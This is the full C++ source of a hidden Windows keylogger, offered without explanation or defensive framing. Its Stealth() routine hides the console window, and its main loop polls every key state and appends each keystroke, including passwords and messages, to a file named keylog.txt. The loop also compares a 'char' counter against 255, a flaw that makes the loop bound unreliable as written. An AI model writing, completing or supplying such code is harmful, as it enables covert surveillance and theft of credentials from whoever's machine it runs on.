#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

void Stealth() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

int main() {
    Stealth();
    char key;

    while (true) {
        for (key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                ofstream write("keylog.txt", ios::app);

                if (((key > 64) && (key < 91)) && !(GetAsyncKeyState(0x10))) {
                    key += 32;
                    write << key;
                    write.close();
                    break;
                } else if ((key > 64) && (key < 91)) {
                    write << key;
                    write.close();
                    break;
                } else {
                    switch (key) {
                        case 48:
                            if (GetAsyncKeyState(0x10)) {
                                write << ")";
                            } else {
                                write << "0";
                            }
                            break;
                        case 49:
                            if (GetAsyncKeyState(0x10)) {
                                write << "!";
                            } else {
                                write << "1";
                            }
                            break;
                        case 50:
                            if (GetAsyncKeyState(0x10)) {
                                write << "@";
                            } else {
                                write << "2";
                            }
                            break;
                        case 51:
                            if (GetAsyncKeyState(0x10)) {
                                write << "#";
                            } else {
                                write << "3";
                            }
                            break;
                        case 52:
                            if (GetAsyncKeyState(0x10)) {
                                write << "$";
                            } else {
                                write << "4";
                            }
                            break;
                        case 53:
                            if (GetAsyncKeyState(0x10)) {
                                write << "%";
                            } else {
                                write << "5";
                            }
                            break;
                        case 54:
                            if (GetAsyncKeyState(0x10)) {
                                write << "^";
                            } else {
                                write << "6";
                            }
                            break;
                        case 55:
                            if (GetAsyncKeyState(0x10)) {
                                write << "&";
                            } else {
                                write << "7";
                            }
                            break;
                        case 56:
                            if (GetAsyncKeyState(0x10)) {
                                write << "*";
                            } else {
                                write << "8";
                            }
                            break;
                        case 57:
                            if (GetAsyncKeyState(0x10)) {
                                write << "(";
                            } else {
                                write << "9";
                            }
                            break;
                        case VK_SPACE:
                            write << " ";
                            break;
                        case VK_RETURN:
                            write << "\n";
                            break;
                        case VK_TAB:
                            write << "<Tab>";
                            break;
                        case VK_BACK:
                            write << "<Backspace>";
                            break;
                        case VK_ESCAPE:
                            write << "<Esc>";
                            break;
                        case VK_DELETE:
                            write << "<Delete>";
                            break;
                        case VK_CAPITAL:
                            write << "<Caps Lock>";
                            break;
                        case VK_SHIFT:
                            write << "<Shift>";
                            break;
                        case VK_END:
                            write << "<End>";
                            break;
                        case VK_HOME:
                            write << "<Home>";
                            break;
                        case VK_LEFT:
                            write << "<Left Arrow>";
                            break;
                        case VK_RIGHT:
                            write << "<Right Arrow>";
                            break;
                        case VK_UP:
                            write << "<Up Arrow>";
                            break;
                        case VK_DOWN:
                            write << "<Down Arrow>";
                            break;
                        case VK_CONTROL:
                            write << "<Control>";
                            break;
                        case VK_MENU:
                            write << "<Alt>";
                            break;
                        case VK_OEM_PERIOD:
                            if (GetAsyncKeyState(0x10)) {
                                write << ">";
                            } else {
                                write << ".";
                            }
                            break;
                        case VK_OEM_COMMA:
                            if (GetAsyncKeyState(0x10)) {
                                write << "<";
                            } else {
                                write << ",";
                            }
                            break;
                        case VK_OEM_MINUS:
                            if (GetAsyncKeyState(0x10)) {
                                write << "_";
                            } else {
                                write << "-";
                            }
                            break;
                        case VK_OEM_PLUS:
                            if (GetAsyncKeyState(0x10)) {
                                write << "+";
                            } else {
                                write << "=";
                            }
                            break;
                        case VK_OEM_1:
                            if (GetAsyncKeyState(0x10)) {
                                write << ":";
                            } else {
                                write << ";";
                            }
                            break;
                        case VK_OEM_2:
                            if (GetAsyncKeyState(0x10)) {
                                write << "?";
                            } else {
                                write << "/";
                            }
                            break;
                        case VK_OEM_3:
                            if (GetAsyncKeyState(0x10)) {
                                write << "~";
                            } else {
                                write << "`";
                            }
                            break;
                        case VK_OEM_4:
                            if (GetAsyncKeyState(0x10)) {
                                write << "{";
                            } else {
                                write << "[";
                            }
                            break;
                        case VK_OEM_5:
                            if (GetAsyncKeyState(0x10)) {
                                write << "|";
                            } else {
                                write << "\\";
                            }
                            break;
                        case VK_OEM_6:
                            if (GetAsyncKeyState(0x10)) {
                                write << "}";
                            } else {
                                write << "]";
                            }
                            break;
                        case VK_OEM_7:
                            if (GetAsyncKeyState(0x10)) {
                                write << "\"";
                            } else {
                                write << "'";
                            }
                            break;
                        default:
                            write << key;
                    }
                }
            }
        }
    }

    return 0;
}
